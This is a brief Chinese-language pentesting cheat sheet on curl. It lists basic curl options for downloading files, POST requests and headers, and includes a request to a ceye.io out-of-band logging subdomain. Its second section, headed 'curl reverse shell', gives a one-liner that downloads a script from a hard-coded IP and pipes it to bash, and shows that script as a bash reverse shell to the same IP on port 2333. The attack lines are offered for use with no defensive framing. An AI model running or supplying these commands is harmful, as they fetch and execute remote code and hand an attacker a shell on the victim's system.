curl发起请求
```
curl mycurl.2qytvx.ceye.io

发起请求
用法：
curl -O index.txt    下载文件保存为index.txt
curl "http://xxx.xx" -O index.dat    下载二进制文件保存为index.dat
curl -X POST           post请求
curl -H "xx=xx"       设置请求头
```

curl反弹shell
```
curl http://47.109.58.205/fanshell.txt|bash

fanshell.txt内容为：
bash -i >& /dev/tcp/47.109.58.205/2333 0>&1
```

